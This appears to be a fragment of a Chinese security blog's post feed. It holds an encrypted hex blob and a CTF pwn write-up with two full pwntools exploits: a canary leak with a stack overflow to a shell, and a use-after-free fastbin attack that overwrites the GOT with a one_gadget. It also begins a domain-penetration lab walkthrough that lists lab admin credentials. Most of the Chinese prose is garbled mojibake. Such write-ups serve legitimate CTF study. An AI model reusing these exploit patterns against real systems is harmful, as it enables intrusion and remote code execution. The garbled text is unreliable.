4ebbf3bd67987b36a40b9fe91de0f99a65337e6da3e504e5ec59f368dab7f282bdbe0372f8085e163e4687db1bd1f9355464ea8a1d33e3fdc4f53bc9a3b1984a35fcd705c5baf54ef901be843c9d451300c7c7fd0b3e9dc3c9b2b36b36d565500f33af8c3d71febf10077004cb93d6cdaecaa424b24c969bf7eb16a8bf24ffe11c9ba2c7bf7db90a67e4dab5b3e3f67cbb3ff2475b0916fe267432c70d2bc4f0809397941acee1bf626b3106c6ee1fe860653b3a56e92093e089e35a400537e6db289d28154e6c99e51f5e0472b17eefae15dddab994eaff245c8c5d228e97da3d6a3012f434c7a54c271f40517efcbbbb6aaf47fec09e070b95460096c6f36f458ab3dee6655549a317d231c160a78b8f995180e1d0b69458dccd8bef8a23da62a6d27993cc155e571c698844b4724372ba3a58cad8a014b958491c855206c144a4edd52c8a45a84c96626bcf1bae13693d8a80e67d55cc043cb43f5a13fffb999b25e14e829b0481355cd0d65a560592b292659b33e1adef3ce77f506ae09f79b53c73097b7f3f4786de27bf4e3860402255cbacbadbbc6f0faf988d9e07494cbe3808f672f16e0fa6fd21c85556a632745cdd8d58cfdfac589554eb0315ed302e0179df0c7a3c8cce29562aa6ce86df048b8b298d885ce663b3ec93214960075619a2af274854a8820585b468b1fb829283dc6e0a555478b08955bb314e99fa08d1d3c617abab850a9fc2c2a5954f87df88d442ef6c6b8ed52caf9288c39a8f1c51c409bacc54d8e60d8f1f1af6fc63c0577b2572ee6e02c453101662ce6f6b18cc60241ccd61975988e162bee79b2a25fdebfba5cbe8cad9c675d4247045345ba13d892286aaa7ba4132e130e872c9b1eda484456696bd1663a8d6fe3918833bcae5eca318735d88c99b19fc148ac4f45bfa4aa3e2afc8c15be7d47fcaf9e5ef814f50be1bed34a98be8a4756c8575eebaa8d3046620361bae9bf74436defa8cefbba0f0c27f3429ce4dec81ff71f14cc0114812ec18a86af99c1f9b37265a361fc3a619e7c6be0d77d96b97530d0806682da51be98db09042ca19e2f1a1150ca7b888cdd6ef60d4117829dfa4e5888a78896244004f4bad03e0d9ca2adeaae76e006064d6eb18e311ecf9e65de0a5970c4f6f635ea46c4af4b7ff3de75eef020e6ceb03263c0e6884dac5271e9d0676cdd997daaaa50e2fc855673f06a144c98ef22f26ac468333a2e224d2943da67fdbf475faeb9aeb88cc6ebfab595b576401d585aa561a1c8925709fef2cdda4b5e7dcb138d3396acdc658f9035590ffaf2224d8040b0276c2a85214d60afc8a4a4531921768106d90c4063b124fddf6c7149820726640b9ef32ae23673a2d87dc8aa8cb74fd386e67b9996a401bdeb7658e64975468411079e5f1bac2ccd5cc5d68cdfaa300e430360cc6ce55fc656e159a852b205dfa99f902d0ee066db008d6cababc98039694fde59b01e984e46897e51bdd628b9939a8bca2a8d5680f95b57810ba349f73b2e35b504af43395963b710883a8a348fbe723eb157e2e4b0c6adaeee8ff3e2b4737ca8ec143742e6a0d3c113c01db3011f9f6c6a86e146aad2cd1ce73636a4ed1d17dd77fb084df90105805fc8473e51cd03aac59ce405f6a5505d77b67733cf6e048882a20233c6db0f12f30f5d9a0cf325a17e09b5f78fc8eb803bbb98a7aa8524198d04e00472f3ae074ecd33284d190e3af46afa243dee175a3b86b019b70c943b9e73abd1afd82795440992a035cb14c6b49911bbaccb5740855af6a23510e29e1918bc051fa1826164237bc3b50a28eec4d58c4a1b261f50901636be88a131ac7e4f1776baed69b09959b4af6bc9af557427b411c12c7f63e881bd045401bf63a2086846b83c1cad257688d4b10a9fd02fe5cc954c96e4aa4b512e7a370546037958e41e8e0d4d2b380008e2ae430f691cabdb6190591ac7af6e4c3601ebf0e10019da2854a4c9e732f5d3f29c99ae4a807e684be4ba94016524392ceb12cabb11c75229facbeab9163dd3598d4ebab3cad9ab27197425620c738fc585ea97f542478ca476622b96997d67c40d044a6e92424c5f1a82cb971ad6eb0de80dede3570f79f709917dc310e13fee81c3fda9ab77a8c07452a2835960b92746abe25d20e88ce73f4b4cd225dae63cb7f1d65282f4e3567615f013935ca5e9cb37b6a37aadfd647258d9adcd7c2f4949878183b14d9ef8731b4edbf7fa7a49eb3935894a4eb88cc89f88b17cfc02cfd617b67b5c2e7419e93bbaf7fb1b13e9cb2f7ac905d067364657914f3b5538c52ecd2a7eafc2e5363c0036f346f65b3789d2564aafe3bbdb8f9e312e3904d2ed3a8e0f27f1aa94c2c6a425bc81051134d515509615967551009b6ca1277eff11b0debffd5feab5c89ca7dfc9d66171f76587355688d8677a49d197cbe7688535d3a7b8c4f72d781809877fd2f1996d5a66a44426b77247d6ee2771c024f2f78cf64449b835bf4952e9b8527b8311ea4042fe3ac86da4bde8e194f322ae3198a51ee8a29ec70c0c33bd400edf654ea28f603f1f8b96eeacbadc077ba91cffdead503e4580f505e7c4cf1d1d22600248ff2ac7b19ceb6aa4d9f257f86f2a48578aca550642454e5fe5660c8c9020cefd4bb6eb245ec1157c6f9e3c66befc116cf70451aac3a3df5708c5c583de57000a50fc317945e0723a4da63e9a117a80ef1c1a6ab47a127812f76e08d262b3c6db15fe669179549f8d59ee6df8fc0bdd406252f559e8b9acf5db693712d7a88555437edcbc0c0536f7836ee1b03fc9fd3f85315c61cd28d399e1549ed4eb5d4d217a5725764aca857881b2a4fbd95e17eb9ef77b4998349299db601de480ce587c58a00be0fea8c4956d9c47c0d6b0730421b14e392bad9bb716562defb24418b40f7d38650f48cdefc982e28ff5be4f6cc72d4036f471a6664c6abb025d03b31bda7f196ab991692fbf7b71f7bb86e45debcd6cbdd3fbdac85b2a233e875852e45e83759c330b9a27a256176113731e3bb71473b8f043ced7462593083c96122c799a0c4b95f1c58938a88fa3040abafe58b9393ace7315821fa59ecc0bfefb47b2a3e0b1aa02220080d1cdc097db90db3857d1a1e6adc85d7c63fc995e0130da09a9a18ededeb461824769d422f2559e00e4ffd19e462b9500dc347525a0b9b7cb3b978aa7d7acf5585f0491e3941b2826247501870e0b04f6c77101240c7850aaf4d5f5ce2df929b1840d9e4a5be50cef586f2242d6480744e6ee91770d756de305c5cfe90c50370d9fd61f02a44467a81eb2ec81117b795cba192d2256b884dc6b01a15cdbe87ddf1bf3990fcbb74ab7d5d0abacc92afefde294b9e57e56299abc2a23817068f66d409090d79ab89fa0da25d828bd8e7065ef0a779a5c6874489bdb614100028c6ce16926deaed47b8ebc51519fde9e6319d5888a930045b91509ec8556adb9001a855e530f5cbe8fd94b0c1ffb5c4c219fccfb2176c520fea183fa4c59f087350be922ea165fcca7ae0631bae8d0a83893a96e6bbdbc94b440159f857a668b2fc9e9bf41543c4b781d1f6f5116f9fbc3ebc7a97bee2f52b5930df22cabd4311a9b5a0c2f6af482f72cdf122ade0d7adf4984eefe9c7f2ffafbd610a31c2a38cfc10d6ed524e89b91d7e23bf2f43671df2359bdc7ff1a8bfc0757ee29a1cddc1c3b75c6a680f0f97bc1a90942adef8b68f6305f0c841313f1a66bd76ae1be561808734e41be34c01ebe54d34b3b208e5447d9796df3c323281b1da6943f45c0dc5fbbca52b7bb2c78652c576a01aabed8f0052184b40ccd78278169fac7e34a76f514b533208dddfc959c3934f9f784838207e9ccd1db519ca978d18f69255c80994e9ca85dbcf0c5a614efcc315eeae52e23c2da29e19e03c24c550ad86d58a9e97f8f13734f0a9c233a415f6eef28c24c1d3c13517b62fe529579efa643c07308bc83c6ca6f25cf3034a3425cc9d224d1429a43eb50b9ce3a4b7e8e932eba66ac73eb58809571aea051d22288ac14cd091b5e394d7cde585f183ad7aa5c8fc22a1236b8161affd9d7c2f04daa966fc77336db942d870b72c923172913bcdd50c63a8eaaaa0d749b61a1574eb16e2c3485582c176727a926efcffd4753475642ff87409216c2b5dd10dafe8633adf7db2d3e5cb470e678c01b7f43244180b5ea6c1efdfca5c2d49f837bd843eeb9c335b70698915f8dbd0730e5a20b0f5ca726ed1bffcf677fe9207f805d9ad9a95d36f14043a0637a7b572388fa3a275f30f37eecd1b80d8e71c0710f1e1edbe5745060cad868f9c839b8a5dae8086d82cd839771f1137104047649b64a273a926335ddd6135c78008ba46d97b020f3fb813fd2572b059bc9bca8d87002abf5ad57e9919d08f9a67dd34f97de61804c48473032f2b2fa6a8c2c981f9c5e2fb043e9c6a8d1394113d6bd1918f571b68bc8c7f7c9876e21556c2df2d413be3369ae28adf83794467b1b7b1c52cf2f8fb002cb9c7ec2804ad55f3e4fc96836a07a6212cac1afd3b46eeba0d6793552e83f3e8173e3cfa0a29d528b62f29c5f7a62a644e9d9ea43a0be38b812d8c5f297c6fd2500e0e62869c4e7d1d936e64cec2957f66cab23e8eb1905e3e51ff03583b3c22bf2ad4db5fdd3f2f943fb61385fd1bffaa45f4aeeba4a58fecf7fde4d1eededc37f3af5c24d4af75635b1919ff84b4cc7661b7c2d15559a7cf4be596a9c6658999eaafd216db208cb7fce4901e703298c3eef00c35f8cfed806e5509b4e2a7810c2dc52179a4772ba98bbe3fe7cfe924ce0eef02acdff7c5539ec7c5dc11d20b81ba2ab92811b4eea3d270f77aa757ede007acef03f44848478c79814fd55d86de7c5fb33d274dd34366df479403bf8fafbee847e7ab08a9a4fcb995b6c16f24cd387c610339770a3b2209492819252035ba4080d4f38e3b7a69f5e1bbd8ca1237049e2979d671d54d6b49501f912ca5915334931ba8f83f6b3afab4058eacb505226fc2847cc73a0f27a6a8cd2a14923aaffaf6d9518fb755a20effee11ac9231c6f64aa989c7a5f16662a30c6b0b525632016845701df82ede162075d4424d8b356369625876cae21d915de5726529ac2f11cd3e7a9506b926877fedd3c51e055f049456a3603a3a352a83cc19738719fe3f8e1172ba68cdd99270007a79d63dfadae82dfe85334b6b0a84299b57302bba34864352152b16ad6f9fb8135bbc54a2aba62db980b6cba9c46fff7aeeaffba5d2b3a1ac9887b2fde11fedd40019e15318b59b725d671954ead0086ae96f2be71c5165f402f810aff46934e950c63b240d8553bf58d43dda1907d1c2aeccd174c5820240fb74e50ec5a16f519921f44b63f993ec04acdefa813473e57ce55c4d920a0bbcef1be135ecfd3604f38247cd7da2c81a261a6731be4590544a1271211f5ae060eee67759d1a5ea0ec68caf0ce528c43febd6040aa59637de9f0902af0a9932c366aa7df5afa210ba149c485322d6f84cb4909f87078576cbb5c0124ce00931899a4a9b316748592ae0adfaeb9e02a3914a51451448616d8eeb755ac6057b2b514eb833d1ee08d20b1f5d3e82ecbc01f6cea9930fda1b97835c2c47068de2d01294545a10e546d0c7a9666cfda945e97845fa167bb05f95de669c06608993ddf1a432fed4c84736544330b5a76b9b3da8ef345c2eb04bc3e44a12b7526c19f61170c0d5999a9e22a19f2b910a3fe03718beb53a2577e03aca3f9dfeb7f2c8ba6210e03a87d06769df1f899d7d133552ff9be04cd8a2ca10dc41d8692d3ba3152731800f94c1e5b326f769dff578f5e9b46a3005800fa319d9921f1c85ac019653f0ca03039bd167ccf37d30794c4a999813c35353159203e92321e5ac00888411724538a9b6870d1213a5bb35f0cbeb9a435b26bc7162d11433eeb402ae7a29f928f63925fda434978f99e82d22c4f99597dcaffce6ab059b158ff10271326dbe3381b19da4c8783bab2d391a0fdae6c3510f9844f297c285084e50cb1313285e7ac93b0eb54b56b2017d2327c4d57f968d8e6beacbc3ea9c8ac649bc342d91789479d040f1c32491659f1b3bd224bf18c8b06b72a9fa5131b5cba35455b54d0eae8e34d2d6b55839c43e66dd76912e7883cd6130ad17b40ad489fb17eccc7d8cd83b7160365d6e9f3ce3dbed41d038c98c49a39c9c3bfb43b06cafe279f7fb7c77fe0acf618923bab7a9d2e0be7d66547d2ad3fc8fde2087824df597b8cfd7d65e9901e7bcb3774e49ede01c770d2bae0f0a25844f5cfa7c824dd2939fc17856a8750711efe48d8ba56f517aae34197c0b5d986cc6a599da307667f59e5a8643801b5c2080c5b8dff8c42dd7889f99f5efeb563f455b7091893e0f78284798c6cb8696212e113e330f8be14bfb9ae98af8beed637a762cbaed7ce383414a68e952dd33110af05c128de68a842c159ee10de42b5c3690314ede6d003c3a81ca63a8eee7e108de1a05e2d737b7eb505979a344428e587cbed2a760809e49849380230710736dd896cff733de304da01e15b3227bef9c6031e11283022a2352f0b1da923af4788d76a2bb0f98baa55efd3d418f1ac546cd3016f237145b0a3db1f8db074a36668210d2a47f9a958bcaf618e4c1249adf81ecf57b90d4d040ae56a1f8733afaa7bc3c4337e16d704c4e76cf3207e1bfbbcd2776608a9ee5fbb487e56eb480d1420bc7ae647db599e3028b0764971cb7d9b0f0e0fe038e8134828f2de1c3d4bbdf61df4c81c25a9a7e0d477d035002bcc29171fa7fa0224ad90db1f825f18551aee7d5926f883ecc2f8363e07e47316173b67c0252c4f2bafc0ebc251a5a5009ccc8920d0debc4b180adf681f96f5c0f73df7c8383b268c5c22b4adc6ea7a3694c41b333afdd82e11088ad5c5d26ed0a9895b56e9a562d975ddc68eb8007d2c78472f2e5d7c1883000c65c4dd977108d31a3806675ef3878d452edb839fbc433f52d92333e6e45a8e512a9ff28fe97d8ca6e262264b94f04a50d5ca8c94fb9df0dd072573426bb40b5621b2bdd9f188d5ca6672c0be916ee5b4a2a18320d3dd4239d2488b02f7d1418f22986ec89b47f0afc1880c01915ab751ad82393cdcfcafd7ad541bd5911aaef69ccd7761221b85bd61700d855f8db3568ddd4662602e9f0ae25bea443ca1075a080642389e84a02e0ec87b37571a941af13a71e69af472822b42747a17d10c809338640a72a62f8a1e815f23edac6df44d31638e6b1ab1dad09fb7ffcbe93d912d11f7d9dce7586071b9e2cdb440d4c1513a786135895949653e20f5fdf12129b4688c697a4f927c97d722190855366670fb51a81242a29e8a54856e0f73dc853da3391295a57152b765525c36fe0217d27e7cb10378c3c48d431daaea254fc9ee6f78cc6866d20d83bf6365ab737aec0e0933985cff9b98ae7900b96f93ce4d2fac570c81bdffb3a2cfd011742776ed9a7fb7bbf5402e40d32e2c2fc729463cffab5d078917e15d7de291073544e1fd942551c2c390f7a3d7020cd70f2ccd726788d1c7103b367c37b8a3c9677c7f73a947857260fc2767eb55a2fc317a865cede6cc5e2c46a20da35d9b318555cdac1168cc21799621d6275bcb9cde7f47b6bf01a992cd603881152cb485dfea59a4ac1aefd4c5e12bda7a742b43a9646509da94a72e5f5a9794620007dc8501829df5ea4318998f206f1f6c97036fa42fadcd3573815c4d0f0e396df954516170636101d7c504a411e144a42d7ab8e2e941ed328f45ac17c80288575bfa330a91428a461363dc047fbc97b52d7ce9d107e95617cbf6133a6b47e08e07e332dd178ae57cb5ed491a536a6a42bab23174b6c69d9b644293d50593a279e7507b688b7bc0a4263319fa6264f747fab298890cf2394e177e7dc07d918ece7f29d360cf02c4882819bf3d8065c75d287bd6cf1613640e6d7c8afa5336e876acca4a150570030142c81441b6ccdb647d000522867fc4bd85a621445cf38f2a1ef6293f6bfe20dcc982237ab7aff6a6c7f80b1867bc74a5a44643c2ca856fd27822fef99e2cc86ae2df53fe6ab8fbb5acf7a49e08165fdc0478b97b6befc529bb6bfff221f4eb1e781f0556bc2ae8465d6af6c0ac991e79b422063f7a39d3a19378d6de4851d7c2e632ec819bd720bfd020d3e35b80bf6cd1c43bd4396760b8ae034d0a7edb77b4559c0f90fb2b304eda08783cd38d781ba166c1001019c40cfc35bf739c6c849db10b7af0aebfc0905c3a66bbfc86f42fee304d2620300e81142bc5a7a5db603fdc595d0fae7f961425f5b54f2a673300b8e701b26d76a9cbbd63d9b6846350994297ef186d25a3c6a9f230102e67a32aafb1fa66e1f84f41919d2dc663a05013e098e65487290a33da121504f031a38e372ef621f4800870369d62925d5b2c2452c623c706c56c60a44d27ffccbf9c9b459ccdff8a87690bf7c1eaeee541738212a7082653e0c588b150257147e32d0708d9b009ceac0c7c2fba30b804f5e71dcd8458a0388d77e5d5dd788fa06c64b6e68f0e24fd24b2d66565dc5140839871faa1911ba653ff05bd59c5828fee622f93609bd9257e355db6e87465667deaea42a6ab7ecffefb10073a2f066ca29671a913c24d46db2c48198d36fec6c81e0f7e4e063fb069426166ef0e69effc2fd91f51d9664569d34d0ea0fa8d021b707878e9453b3e9e70ee5456bb4052b2ec74c70c88dd306cfde7e8f70dec91449c20529b941e71f7a731e900ab9116f70b0683bd595162f80754596bdf84871caf831a22be52022c1e2e38c65b981b34b45cffbc7b2ce68c54ec24db15afa794432cf9adea4848da93cd40a2b2a5dec6bd3c72627740991c69d82681d7a7612db82ccfe0ddaecc52762bebe1c35dc73590593bef6250a83a1e36123f83d965ed519c2861636ccdf52d541000712a5850b400f1b6de8c65c72cb2d1d1c430e7755f3166eae29c4a616eb2f45833a0accc63137c7e27b05353d08ba9437b33885517b95f829a84e87338f9e457caa8567b92096e1bc196112eef714021c2c596af09c58571b1a567b8bd59dafdfc79d8540a28ac2e5309168a319b6d6de98e943b3fbcfb91910d622f3ce964e46f422a51bd00b9d25c0d0753b6fd0b8daa11b4e82972caf0b7c44a6d724d390a15506f42a250f8e26d762316715c50cf1d31a058b8425812dfc68cd58b01bcfc6cd770e013fec3284be3066697f1f3fa0dda44c369fe6a356bd91ee937c098a801a72b5b17378256b58263ff0bdac455aceadd7ab73d92f5476308e82c57b59bfc95c27fdba423523521ffcb263ae4f0453d3ad9dee04a0c318777c1ac4981c6db8fa4c1ab98f0c840dfda5f41912990ead37e7b541d440fa762ca3190ad573ec3d5e2d40f6ee9767aba21716d989686a47b9b10bec748f89b213c5a17e072b391e51b38bec692471541e8eedf49e8d4dea7cbdb9a0e18b27f27d4526d7d6f47ef76ddc8f71ad4ca3952ed47c15381f302f84870dc6ef37eb80f73b8f3da42330e80dae7518b041a95c53d647ae60fc66bea2e0fb73d33b34cc2b33b92a401467d7ec58012df0b0676a3167bab4c6b2a39ab74e52ae8af64f9a410d76f1104fc637d35a0180fad235bcdcff6bc011020c06f10139d396b7c7a4bbdf469727bbd8622d19464bb7d23b0f297e3ee9a3ca27faf0b827af335986bcc6d7c4fb2fce184a0d94fdf680e7378fe9401ba5f81801040a8eaf87258f7e34b0151d2862c77d08309e9a94f87cd53e7027a336bf39d12e9cd06b1362ba4914d8b91c3360f6ac953bde3bf8e672e330286780a9d84c820411147bb78a2f53cfc7c0d508233413af5cb2e90ebaa6b6d4102a5707d3af181d8ba97d5338c711654b38a319a3d65357b9074c7d25fe6bc3375c8df27438d862bea012b2dc1367c471c1c4fd4b56907b3584a5386a41b0b3c8589508ada859e8bcb780a8e2290bdfc29093a5a7f67f51c26cb84ed5b313000263f595b32d2dc6057433301bd9f0303824e8d2a4a29de2232fe28c10aaadd10ff4eb6556a2e8c78a803c90ed233294b01cb153773589f5d1134fd543d101834cc203b4dfd895e212f90c34961ce86aa077e73b968cbadaf1e8e9023f2c7ab0eac9ad5da1ffaa4ae3b37d2398d912ff975caf8a455a3d2fa4f07a7632b91a957011ed9d6ca0c8f1edd33889c06 ÊÇ®Â•Ω, ËøôÈáåÈúÄË¶ÅÂØÜÁ†Å.]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[PWN]2020ÈìÅ‰∏âÁ¨¨ÂõõËµõÂå∫‰∏™‰∫∫Ëµõwriteup]]></title>
    <url>%2F2020%2F11%2F09%2F2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂè™Êúâ‰∏§ÈÅìÈ¢òÈÉΩ‰∏çÈöæÔºå‰ΩÜÊòØÊúÄËøëÊ≤°ÊÄé‰πàÂÅöÈ¢òÔºåÁîüÁñè‰∫ÜÔºåÂÅö‰∫ÜÂ•Ω‰πÖÊâçÂá∫Êù•ÔºåÁïô‰∏ãÊ≤°ÊäÄÊúØÁöÑÊ≥™Ê∞¥„ÄÇËøòÂ•ΩÈòüÂèãÁªôÂäõÔºåÂ∏¶ÊàëË∫∫Ëøõ‰∫ÜÂÜ≥Ëµõ„ÄÇ È°∫‰æøÈôÑ‰∏äÈ¢òÁõÆÊñá‰ª∂ÈìæÊé•Ôºö namepie.zip onetime.zip namepieIDAÊâìÂºÄÁõ¥Êé•Áúã‰º™‰ª£Á†ÅÔºåÊºèÊ¥ûÂú®ÂáΩÊï∞sub_9A0ÔºåÊ†àÊ∫¢Âá∫Ôºå‰ΩÜ‰∫ãÂÆû‰∏äÊ≤°Ëøô‰πàÁÆÄÂçï„ÄÇ 123456789101112ssize_t sub_9A0()&#123; char s; // [rsp+0h] [rbp-30h] unsigned __int64 v2; // [rsp+28h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;s, 0, 0x1EuLL); puts("Input your Name:"); read(0, &amp;s, 0x30uLL); printf("hello %s: and what do your want to sey!\n", &amp;s); return read(0, &amp;s, 0x60uLL);&#125; ÊãâÂà∞linux‰∏ächecksecÊü•‰∫Ü‰∏ãÔºå‰øùÊä§ÂÖ®ÂºÄÔºåË¶ÅÊàêÂäüÊ†àÊ∫¢Âá∫È¶ñÂÖàÂæóÁªïËøácanary„ÄÇ canaryÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇ‰∏∫00ÔºåÊâÄ‰ª•Áõ¥Êé•ÂÜôÂÖ•0x29‰∏™Â≠óÁ¨¶ÔºåË¶ÜÁõñÊéâ00ÔºåÂà©Áî®printfÂ∞±ËÉΩËØªÂá∫canary„ÄÇ Á®ãÂ∫èÈáåËøòÊúâ‰∏™system(&#39;/bin/sh&#39;)ÁöÑbackdoorÔºåË∑üÊ†àÊ∫¢Âá∫ÁöÑËøîÂõûÂú∞ÂùÄÂàöÂ•ΩÂ∞±Â∑Æ‰∏Ä‰∏™Â≠óËäÇÔºåÊâÄ‰ª•ÈöèÊú∫Âú∞ÂùÄ‰πüÊ≤°‰ªÄ‰πàÂΩ±Âìç„ÄÇ ÊúÄÂêépaddingÂ∏¶‰∏äcanaryÔºåËøòÊúâÂ∞±ÊòØËØªÂà∞ÁöÑcanaryËÆ∞ÂæóÂáèÂéªË¶ÜÁõñ00ÁöÑÈÇ£‰∏™Â≠óËäÇÂ∞±Ë°å‰∫Ü„ÄÇ expÔºö 12345678910111213141516171819from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './namepie'if sys.argv[1] == 'l': p = process(['./namepie'])else: p = remote('172.20.14.91',9999)# gdb.attach(p)p.sendafter('Input your Name:',cyclic(0x29))p.recvuntil('iaaajaaa')canary = u64(p.recv(8))-0x6bprint(hex(canary))p.sendafter('and what do your want to sey!\n',flat(cyclic(0x28),canary,0xdeadbeef)+'\x71')p.interactive() onetimeUAFÁöÑÈ¢òÔºåÊúâÂ¢ûÂà†ÊîπÊü•ÁöÑÂäüËÉΩÔºåËøòÊúâ‰∏Ä‰∏™ÈÄâÈ°πËÉΩÊ∑ªÂä†Â†ÜÂùóÂπ∂ÂÜôÂÖ•ÂÜÖÂÆπÔºå‰ΩÜÈÉΩÂè™ËÉΩÁî®‰∏ÄÊ¨°„ÄÇ UAFÂ∞±Â§ÑÂú®delÂäüËÉΩÈáåÔºåfreeÊéâÂ†ÜÂùóÂêéÊ≤°Â∞ÜÊåáÈíàÁΩÆÁ©∫„ÄÇ 12345678910int cmd_del()&#123; int result; // eax free(buf); // uaf result = puts("complete!"); add_flag = 0; del_flag = 1; return result;&#125; Áî±‰∫éÊ∑ªÂä†ÁöÑÂ†ÜÂùóÁöÑÂ§ßÂ∞èÈÉΩ‰∏∫0x60ÔºåÊâÄ‰ª•Âà†Êéâ‰∏Ä‰∏™Â†ÜÂùóÂæóÂà∞fastbinÔºåÂÜçÂà©Áî®UAF‰øÆÊîπfastbinÁöÑfdÔºåËøûÁª≠Ê∑ªÂä†‰∏§‰∏™Â†ÜÂùóÂ∞±ËÉΩÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜô„ÄÇ checksecÊü•‰∫Ü‰∏ãÔºåÊ≤°ÂºÄÈöèÊú∫Âú∞ÂùÄÔºåbss‰∏äÂàöÂ•ΩÊúâ‰∏™0x7fÔºåÊâÄ‰ª•fake chunkÂ∞±ËÉΩÂºÄbss‰∏ä‰∫Ü„ÄÇÊ†áËÆ∞ÂäüËÉΩ‰ΩøÁî®Ê¨°Êï∞ÁöÑflag‰πüÂú®bss‰∏äÔºåÊääflagÊîπ‰∏∫Â§ß‰∫é1ÔºåÂ∞±ËÉΩÁªïËøá‰∫Ü‰ΩøÁî®Ê¨°Êï∞ÁöÑÈôêÂà∂„ÄÇ ÁÑ∂ÂêéÊîπbufÁöÑÊåáÈíàÂà∞gotË°®ÔºåÂà©Áî®ËØªÂäüËÉΩÂæóÂà∞libcÁöÑÂü∫ÂùÄÔºåÂÜçÁÑ∂ÂêéÊîπgotË°®‰∏∫one_gadgetÁöÑÊñπÂºègetshell„ÄÇ Êîπ‰∫ÜÂêéÁöÑbssÔºö ÊµãËØï‰∏ãÊù•ÔºåÊîπreadÁöÑgotÔºåone_gadgetËÉΩÊ≠£Â∏∏‰ΩøÁî®„ÄÇ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './onetime'elf = ELF('./onetime')if sys.argv[1] == 'l': p = process('./onetime') libc = context.binary.libc print(libc)else: p = remote('172.20.14.91',10001) libc = ELF('./libc-2.23.so')def cmd_add(): p.sendlineafter('your choice &gt;&gt;','1')def cmd_edit(content): p.sendlineafter('your choice &gt;&gt;','2') p.sendafter('fill content:',content)def cmd_show(): p.sendlineafter('your choice &gt;&gt;','3') p.recvuntil('data:') return p.recvline()def cmd_del(): p.sendlineafter('your choice &gt;&gt;','4')def cmd_add_name(content): p.sendlineafter('your choice &gt;&gt;','5') p.sendafter('Hero! Leave your name:',content)# gdb.attach(p,'b *0x4009be')fake_chunk = 0x602090 - 0x3read_got = elf.got['read']# print(read_got)cmd_add()cmd_del()cmd_edit(flat(fake_chunk))cmd_add()cmd_add_name('\x00'*3+flat(cyclic(0x8),read_got,cyclic(0x10)))read_got = u64(cmd_show()[:-1].ljust(8,'\x00'))libc.address = read_got - libc.sym['read']print(hex(libc.address))# one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]cmd_edit(flat(libc.address+one_gadget[0]))# cmd_del()p.interactive()]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>UAF</tag>
        <tag>StackOverflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ÂüüÊ∏óÈÄè]Vulnstack2_walkthrough]]></title>
    <url>%2F2020%2F10%2F20%2F%5B%E5%9F%9F%E6%B8%97%E9%80%8F%5DVulnstack2_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄFor some reason,I can‚Äôt explain.Èù∂Êú∫‰∏ãÂÆåÂ•ΩÂá†Â§©‰∫ÜÔºåÁé∞Âú®ÊâçÂÜôwalkthroughÔºå‰∏ªË¶ÅÊòØÂ§™Ëèú‰∫ÜÔºåÂà∞Áé∞Âú®ËøòÊ≤°‰∫∫Êçû„ÄÇ„ÄÇ„ÄÇvulnstack2ÊØîvulnstack1Â§çÊùÇ‰∏ÄÁÇπÁÇπÔºå‰ΩÜ‰πü‰∏çÈöæÔºå‰∏çËøá‰πüÊòØËÆæËÆ°Âæó‰∏çÈîôÂæó‰∏Ä‰∏™Èù∂Êú∫„ÄÇÊÑüË∞¢Á∫¢Êó•ÂÆâÂÖ®Âíåde1ayÂ∏àÂÇÖÊèê‰æõÁöÑÈù∂Êú∫„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫ËøôÊ¨°‰πüË∑üvulnstack1‰∏ÄÊ†∑ÔºåÂàíÂàÜ‰∫Ü‰∏§‰∏™ËôöÊãüÁΩëÁªú„ÄÇÂ≠êÁΩëÂú∞ÂùÄÂàÜÂà´‰∏∫192.168.111.0Âíå10.10.10.0„ÄÇ WEB.de1ay.comÁöÑ‰∏§Âº†‰∏áÂç°ÂàÜÂà´Ëøû‰∏äVMnet1ÂíåVMnet2 PC.de1ay.com‰πüÊòØËøû‰∏äVMnet1ÂíåVMnet2 DC.de1ay.comÂàôÂè™ÈúÄË¶ÅËøû‰∏äVMnet2 ÊîªÂáªËÄÖ‰∏ªÊú∫Ëøû‰∏äVMnet ÊúÄÂêéÈúÄË¶Å‰ΩøÁî®Ë¥¶Âè∑de1ay\administratorÂíåÂØÜÁ†Å1qazÁôªÂΩïÂà∞WEB.de1ay.comÔºåËøõÂÖ•Âà∞C:\Oracle\Middleware\user_projects\domains\base_domain\binÁõÆÂΩïÔºåÂèåÂáªstartWebLogicÊâπÂ§ÑÁêÜËÑöÊú¨ÔºåÂêØÂä®WebLogic„ÄÇ ÊºèÊ¥ûÂà©Áî®‰ø°ÊÅØÊî∂ÈõÜWEB.de1ay.comËøôÂè∞‰∏ªÊú∫ÂºÄÊîæ‰∫ÜÂæàÂ§öÁ´ØÂè£ÔºåÂÖ∂‰∏≠80„ÄÅ1433„ÄÅ3389Âíå7001Â∞±ÊØîËæÉÊúâÁî®ÔºåËøôÈáå7001Â∞±ÊòØWebLogicÁöÑÈªòËÆ§Á´ØÂè£„ÄÇÂè¶‰∏ÄÂè∞‰∏ªÊú∫ÊöÇÊó∂ÂèØËÉΩÂ∞±3389Á´ØÂè£ÊØîËæÉÊúâÁî®„ÄÇ WEB.de1ay.comÁöÑ80Á´ØÂè£ËøõÂéªÂ∞±ÊòØÁ©∫ÁôΩÈ°µÈù¢ÔºåÊâ´ÁõÆÂΩïÈ°µÊ≤°ÊúâÊâ´Âà∞Êâ´‰∏úË•ø„ÄÇ 